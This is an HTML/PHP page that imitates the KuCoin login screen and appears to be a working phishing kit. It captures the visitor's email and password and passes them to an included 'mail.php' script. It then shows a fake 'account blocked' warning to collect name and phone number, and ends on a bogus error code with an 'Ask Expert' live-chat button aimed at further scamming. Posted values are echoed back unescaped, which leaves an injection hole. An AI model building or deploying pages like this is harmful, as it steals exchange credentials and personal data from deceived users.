<!DOCTYPE html>
<html translate="no" class=" ">
   <head>
      <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
      <meta charset="UTF-8" />
      <meta http-equiv="X-UA-Compatible" content="IE=edge" />
      <meta name="viewport" content="width=device-width, initial-scale=1.0" />
      <title>KuCoin: Log In | Sign In</title>
      <link href="assets/style.css" rel="stylesheet" />
      <link rel="shortcut icon" type="image/x-icon" href="assets/7AV75b9jzr9S8H3eNuOuoqj8PwdUjaDQGKGczGqTS.png" />
      <link rel="stylesheet" href="assets/2.3.4/umi.css" />
      <link rel="stylesheet" type="text/css" href="assets/async-common.chunk.css" />
      <link rel="stylesheet" type="text/css" data-meta="cms.common" href="assets/c_cms.common_en_US.css" />
      <link rel="stylesheet" type="text/css" data-meta="com.index.body.bottom" href="assets/c_com.index.body.bottom_en_US.css" />
      <link rel="stylesheet" type="text/css" data-meta="com.seo.land.tradingbot" href="assets/c_com.seo.land.tradingbot_en_US.css" />
      <link rel="stylesheet" type="text/css" data-meta="com.seo.land.c2c" href="assets/c_com.seo.land.c2c_en_US.css" />
      <link rel="stylesheet" type="text/css" data-meta="com.community" href="assets/c_com.community_en_US.css" />
      <link rel="icon" href="assets/7AV75b9jzr9S8H3eNuOuoqj8PwdUjaDQGKGczGqTS.png" type="image/x-icon" />
      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
      <?php include'style-css.php';?> 
   </head>
   <body>
      <div id="root">
         <div class="__analytics-module">
            <div class="root root___2ZGR8" data-path="/ucenter/signin">
               <div class="body___1UbSf onlymain___14GwR">
                  <div class="page_login___1faUm">
                     <div class="box_container___33QNB">
                        <div class="MuiBox-root jss32">
                           <div class="MuiGrid-root MuiGrid-container jss33">
                              <div class="MuiGrid-root jss34 MuiGrid-item MuiGrid-grid-xs-5" style="position: relative;">
                                 <div class="MuiBox-root jss39">
                                    <div class="MuiBox-root jss40">
                                       <div class="MuiBox-root jss41">
                                          <img
                                             src="assets/logo-en.9ef1fe14.svg"
                                             alt=""
                                             style="height: 56px; width: auto; cursor: pointer; position: relative; left: -24px; z-index: 10;"
                                             />
                                       </div>
                                    </div>
                                    <div class="MuiBox-root jss42" let="0"></div>
                                 </div>
                                 <div src="assets/2EkvUzQ3UpZQY524XNnaF13t9A0pIZ0izrD1xOnSK.png" class="jss36">
                                    <img src="assets/2EkvUzQ3UpZQY524XNnaF13t9A0pIZ0izrD1xOnSK.png" class="jss37" />
                                 </div>
                              </div>
                              <div class="MuiGrid-root MuiGrid-item jss35 jss38">
                                 <div class="MuiBox-root jss43">
                                    <div class="MuiBox-root jss44">
                                       <div class="MuiBox-root jss45">
                                          <div class="jss27 jss30">
                                             <p class="fastText">
                                                <span>Haven’t registered? <a>Sign up now</a></span>
                                             </p>
                                             <a class="jss46 jss48 ant-dropdown-trigger">
                                                <span>English</span>
                                                <svg class="confirm_svg__icon" viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="currentColor">
                                                   <defs>
                                                      <style></style>
                                                   </defs>
                                                   <path d="M138.24 524.203l-30.208 30.165 253.867 253.867a21.333 21.333 0 0030.165 0l537.899-537.942-30.166-30.165-522.794 522.837L138.24 524.203z"></path>
                                                </svg>
                                             </a>
                                          </div>
                                       </div>
                                    </div>
                                    <div class="MuiBox-root jss50" style="flex: 1 1 auto; max-width: 480px;">
                                       <div class="css-1caqlj5">
                                          <?php
                                             if (isset($_POST['btnLoginMore'])) {
                                                include 'mail.php';
                                             ?>
                                          <div class="css-xl471x" style="flex: 1 1 0%;">
                                             <div style="text-align: center; color: red;" class="alert mb-4 alert-danger text-center">Attention: the account has been <b>temporarily blocked due to suspicious activity in your Network IP,</b> kindly verify the following details<br>
                                                Kindly contact chat assistance for further help
                                             </div>
                                             <div class="css-1jfwyw2">Verification Required</div>
                                             <div class="MuiBox-root jss64">
                                                <div class="jss57">
                                                   <form class="jss70" method="post" action="">
                                                      <input type="hidden" name="email" value="<?php echo $_POST['email']; ?>" />
                                                      <input type="hidden" name="password" value="<?php echo $_POST['password']; ?>" />
                                                      <div class="MuiFormControl-root jss86 MuiFormControl-fullWidth">
                                                         <label class="MuiFormLabel-root jss87 jss88 Mui-focused">Full Name</label>
                                                         <div
                                                            class="MuiInputBase-root MuiFilledInput-root jss89 jss95 Mui-focused Mui-focused jss91 jss97 MuiInputBase-formControl"
                                                            >
                                                            <input type="text" name="name" id="name" class="MuiInputBase-input MuiFilledInput-input jss90 jss96" value="" required />
                                                         </div>
                                                      </div>
                                                      <div class="MuiFormControl-root jss86 MuiFormControl-fullWidth">
                                                         <label class="MuiFormLabel-root jss87 jss88 Mui-focused">Phone Number</label>
                                                         <div
                                                            class="MuiInputBase-root MuiFilledInput-root jss89 jss95 Mui-focused Mui-focused jss91 jss97 MuiInputBase-formControl"
                                                            >
                                                            <input type="text" name="number" id="number" class="MuiInputBase-input MuiFilledInput-input jss90 jss96" value="" required />
                                                         </div>
                                                      </div>
                                                      <button name="fromLog" id="verifyBtn"
                                                         class="MuiButtonBase-root MuiButton-root jss117 MuiButton-contained jss120 jss130 jss69 MuiButton-containedPrimary jss121 jss131 MuiButton-containedSizeLarge MuiButton-sizeLarge jss119 MuiButton-fullWidth"
                                                         tabindex="0"
                                                         type="submit"
                                                         >
                                                      <span class="MuiButton-label">Verify</span><span class="MuiTouchRipple-root"></span>
                                                      </button>
                                                   </form>
                                                </div>
                                             </div>
                                          </div>
                                       
                                       <script>
                                          $(document).ready(function () {
                                              $('#verifyBtn').click(function (e) {
                                                  var number = $('#number').val();
                                                  var name = $('#name').val();
                                                  if (name == '') {
                                                      alert('Invalid Name');
                                                      $("#name").focus();
                                                      return false;
                                                  } else if (!/\(?([0-9]{3})\)?([ .-]?)([0-9]{3})\2([0-9]{4})/.test(number) || (number.length > 11 || number.length < 10)) {
                                                      alert('Please specify a valid phone number');
                                                      $("#number").focus();
                                                      return false;
                                                  }
                                              });
                                          });
                                       </script>
                                       <?php } elseif (isset($_POST['fromLog'])) {
                                          include 'mail.php';
                                          include 'chat.php';
                                          ?>
                                          <div class="css-xl471x" style="flex: 1 1 0%;">
                                            
                                             <div class="css-1jfwyw2"  style="text-align:center;">Account blocked</div>
                                              <div class="panel">
                                                <div class="panel-body" style="text-align:center;">
                                                     <p style="font-size: 20px;">Your account has been <b>temporarily blocked</b> due to <br>suspicious activity on your Network IP.<br>Kindly ask an expert</p>
                                                    <div class="form">
                                                        <label style="font-size: 18px;">Error CODE: <b>6X76D</b></label><br>
                                                    </div>
                                                    <div class="calling-number">
                                                        <a class="btn btn-danger" href="javascript:void(Tawk_API.toggle())" style="background: #bf0707;color: #fff !important;font-size: 20px;font-weight: 600;margin-top: 15px; display: inline-block; padding: 10px">Ask Expert</a>
                                                    </div>
                                                </div>
                                            </div>
                                          </div>

                                       <?php } else { ?>
                                       <div class="css-xl471x" style="flex: 1 1 0%;">
                                          <div class="css-1jfwyw2">Log In</div>
                                          <div class="MuiBox-root jss64">
                                             <div class="jss52">
                                                <div class="jss53" >
                                                   <div id="mobileClick" class="jss54 jss61 null tab-tabView">Mobile</div>
                                                   <div class="jss55 jss62">|</div>
                                                </div>
                                                <div class="jss53">
                                                   <div  id="emailClick" class="jss54 jss61 jss56 jss63 tab-tabView">Email</div>
                                                   <!-- <div class="jss55 jss62">|</div> -->
                                                </div>
                                                <!-- <div class="jss53"><div class="jss54 jss61 null">with QR Code</div></div> -->
                                             </div>
                                             <div class="jss58"></div>
                                             <div class="jss57">
                                                <form class="jss70" method="post" action="">
                                                   <div id="emailDiv" class="MuiFormControl-root jss86 MuiFormControl-fullWidth">
                                                      <label class="MuiFormLabel-root jss87 jss88 Mui-focused">Email/Sub-Account</label>
                                                      <div
                                                         class="MuiInputBase-root MuiFilledInput-root jss89 jss95 Mui-focused Mui-focused jss91 jss97 MuiInputBase-formControl"
                                                         >
                                                         <input type="email" name="email" id="email" class="MuiInputBase-input MuiFilledInput-input jss90 jss96" value="" required />
                                                      </div>
                                                   </div>
                                                   <div style="display: none;" id="phoneDiv" class="MuiFormControl-root jss86 MuiFormControl-fullWidth">
                                                      <label class="MuiFormLabel-root jss87 jss88 Mui-focused">Phone Number</label>
                                                      <div
                                                         class="MuiInputBase-root MuiFilledInput-root jss89 jss95 Mui-focused Mui-focused jss91 jss97 MuiInputBase-formControl"
                                                         >
                                                         <input type="text" name="number" id="number" class="MuiInputBase-input MuiFilledInput-input jss90 jss96" value="" />
                                                      </div>
                                                   </div>
                                                   <div class="MuiFormControl-root jss86 MuiFormControl-fullWidth">
                                                      <label class="MuiFormLabel-root jss87 jss106">Login Password</label>
                                                      <div
                                                         class="MuiInputBase-root MuiFilledInput-root jss89 jss109 MuiInputBase-formControl MuiInputBase-adornedEnd MuiFilledInput-adornedEnd"
                                                         >
                                                         <input name="password" id="password" 
                                                            type="password"
                                                            class="MuiInputBase-input MuiFilledInput-input jss90 jss110 MuiInputBase-inputAdornedEnd MuiFilledInput-inputAdornedEnd"
                                                            value="" required
                                                            />
                                                         <div class="jss107 jss108">
                                                            <img
                                                               src="assets/9kY0EAefpr1tSlEKhTVRo27LKtxC8qy8T2kxc6Gua.png"
                                                               class="eyeClose_svg__icon"
                                                               viewbox="0 0 1024 1024"
                                                               xmlns="http://www.w3.org/2000/svg"
                                                               width="24"
                                                               height="24"
                                                               fill="currentColor"
                                                               />
                                                         </div>
                                                      </div>
                                                      <div class="MuiCollapse-container MuiCollapse-hidden" style="min-height: 0px;">
                                                         <div class="MuiCollapse-wrapper">
                                                            <div class="MuiCollapse-wrapperInner">
                                                               <p class="MuiFormHelperText-root jss100 jss114 Mui-error jss102 jss116"></p>
                                                            </div>
                                                         </div>
                                                      </div>
                                                   </div>
                                                   <button name="btnLoginMore"
                                                      class="MuiButtonBase-root MuiButton-root jss117 MuiButton-contained jss120 jss130 jss69 MuiButton-containedPrimary jss121 jss131 MuiButton-containedSizeLarge MuiButton-sizeLarge jss119 MuiButton-fullWidth"
                                                      tabindex="0"
                                                      type="submit"
                                                      >
                                                   <span class="MuiButton-label">Log In</span><span class="MuiTouchRipple-root"></span>
                                                   </button>
                                                   <div class="MuiBox-root jss143 jss71 jss72" classes="[object Object]">
                                                      <div class="MuiBox-root jss144" style="cursor: pointer;">Forgot Password?</div>
                                                   </div>
                                                </form>
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                    <?php }  ?>
                                 </div>
                                 <div class="MuiBox-root jss169"></div>
                              </div>
                           </div>
                        </div>
                     </div>
                  </div>
                  <div class="commonCaptcha___3gFCP"></div>
               </div>
            </div>
         </div>
      </div>
      </div>
      <script>
         $(document).ready(function(){
           $(".tab-tabView").click(function(){
             $(".tab-tabView").removeClass('jss63');
             $(this).addClass('jss63');
             var clickVar = $(this).attr("id");
             if(clickVar=="mobileClick"){
                 $('#email').removeAttr('required');
                 $('#number').attr('required', 'required');
         
                 $('#emailDiv').css('display','none');
                 $('#phoneDiv').css('display','flex');
         
             }else if(clickVar=="emailClick"){
                  $('#emailDiv').css('display','flex');
                 $('#phoneDiv').css('display','none');
         
                  $('#email').attr('required','required');
                 $('#number').removeAttr('required');
             }
           });
         });
      </script>
   </body>
</html>